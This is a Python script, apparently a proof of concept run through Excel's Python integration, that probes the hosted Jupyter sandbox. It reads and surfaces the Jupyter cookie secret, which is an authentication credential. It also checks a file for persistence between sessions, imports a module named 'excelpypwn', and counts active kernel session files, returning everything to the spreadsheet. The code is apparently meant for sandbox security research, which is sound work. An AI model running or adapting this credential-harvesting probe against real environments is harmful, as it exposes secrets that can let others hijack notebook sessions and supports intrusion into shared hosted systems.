import os
import stat
import time
import re

# Try to import pwd, but handle environments where it's not available
try:
    import pwd
    PWD_AVAILABLE = True
except ImportError:
    PWD_AVAILABLE = False


try:
    from xl import xl
except:
    pass


def sort_tuples_by_index_item(tuples_list, index=0):
    # Sort the list of tuples by the first item in each tuple
    sorted_list = sorted(tuples_list, key=lambda x: x[index])
    return sorted_list

def get_file_permissions(st_mode):
    """Convert a file's mode to a human-readable string."""
    permissions = ['-' for _ in range(9)]
    modes = [
        (stat.S_IRUSR, 'r'), (stat.S_IWUSR, 'w'), (stat.S_IXUSR, 'x'),
        (stat.S_IRGRP, 'r'), (stat.S_IWGRP, 'w'), (stat.S_IXGRP, 'x'),
        (stat.S_IROTH, 'r'), (stat.S_IWOTH, 'w'), (stat.S_IXOTH, 'x')
    ]
    for i, (mode, char) in enumerate(modes):
        if st_mode & mode:
            permissions[i] = char
    return ''.join(permissions)


def get_file_type(st_mode):
    """Determine if the item is a file, directory, or symbolic link (junction)."""
    if stat.S_ISDIR(st_mode):
        return "directory"
    elif stat.S_ISREG(st_mode):
        return "file"
    elif stat.S_ISLNK(st_mode):
        return "symbolic"
    else:
        return "other"


def get_file_owner(stat_info):
    """Get the owner of a file. If pwd is available, return username; otherwise, return the user ID."""
    if PWD_AVAILABLE:
        return pwd.getpwuid(stat_info.st_uid).pw_name
    else:
        return stat_info.st_uid

def get_file_timestamp(stat_info):
    date_modified = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat_info.st_mtime))
    return date_modified


def list_directory_contents(directory, file_pattern=None):
    try:
        # Check if the provided path is a valid directory
        if os.path.isdir(directory):
            contents_for_excel = []
            for item in os.listdir(directory ):
                if file_pattern and not re.match(file_pattern, item):
                    continue
                file_path = os.path.join(directory, item)
                file_attributes = get_file_attributes(file_path)
                item_info_for_excel = (item,
                                       file_attributes.get('owner'),
                                       file_attributes.get('permissions'),
                                       file_attributes.get('item_type'),
                                       file_attributes.get('date_modified')
                                       )
                contents_for_excel.append(item_info_for_excel)
            contents_for_excel = [("name", "owner", "permissions", "type", "date")] + sort_tuples_by_index_item(contents_for_excel)
            return contents_for_excel
        else:
            print(f"Error: '{directory}' is not a valid directory.")
            return []
    except Exception as e:
        print(f"An error occurred: {e}")
        return []

def get_file_contents(file_path):
    try:
        # Open the file in read mode
        with open(file_path, 'r') as file:
            # Read all lines into a list
            lines = file.readlines()
            # Strip newline characters from each line
            lines = [line.strip() for line in lines]
        return lines
    except FileNotFoundError:
        return [f"Error: The file '{file_path}' does not exist."]
    except PermissionError:
        return [f"Error: You do not have permission to read the file '{file_path}'."]
    except Exception as e:
        return [f"An error occurred: {e}"]

def get_file_attributes(file_path):
    try:
        stat_info = os.stat(file_path)
        # Get the owner's name or user ID
        owner = get_file_owner(stat_info)
        # Get permissions in a human-readable format
        permissions = get_file_permissions(stat_info.st_mode)
        # Determine if it's a file, directory, or junction
        item_type = get_file_type(stat_info.st_mode)
        date_modified = get_file_timestamp(stat_info)
        file_name = os.path.basename(file_path)
        response = dict(
            file_name = file_name,
            owner= owner,
            permissions=permissions,
            item_type=item_type,
            date_modified=date_modified)
        return response
    except FileNotFoundError:
        return dict(error=f"Error: The file '{file_path}' does not exist.")
    except PermissionError:
        return dict(error=f"Error: You do not have permission to read the file '{file_path}'.")
    except Exception as e:
        return dict(error=f"An error occurred: {e}")


# ############### MAIN code block ################

try:
    jupyter_cookie_secret = xl("jupyter_cookie_secret")
except:
    jupyter_cookie_secret = "/home/jovyan/.local/share/jupyter/runtime/jupyter_cookie_secret"

try:
    persistence_location = xl("persistence_location")
except:
    persistence_location = "/home/jovyan/persistence.txt"

try:
    execution_trigger = xl("execution_trigger")
except:
    pass

jupyter_cookie_secret_contents = get_file_contents(jupyter_cookie_secret)
jupyter_cookie_secret_attributes = get_file_attributes(jupyter_cookie_secret)

persistence_contents = get_file_contents(persistence_location)
persistence_attributes = get_file_attributes(persistence_location)

try:
    import excelpypwn
    # print(excelpypwn.fubar)
    responsepwn = excelpypwn.fubar
except Exception as e:
    responsepwn = ""


sessions_dir = list_directory_contents("/home/jovyan/.local/share/jupyter/runtime/", file_pattern='kernel.*\.json')
count_of_sessions = len(sessions_dir)-1 if sessions_dir else 0
contents_for_excel = [
    ("execution",
    "jupyter_cookie_secret",
     "jupyter_cookie_secret_timestamp",
     "persistence_proof",
     "persistence_timestamp",
     "fubar",
     "sessions",),
    (time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
        jupyter_cookie_secret_contents[0],
     jupyter_cookie_secret_attributes.get("date_modified"),
     persistence_contents[0] if not persistence_attributes.get("error") else "",
     persistence_attributes.get("date_modified", ""),
     responsepwn,
     count_of_sessions,
     )
]

pass
contents_for_excel
# sessions_dir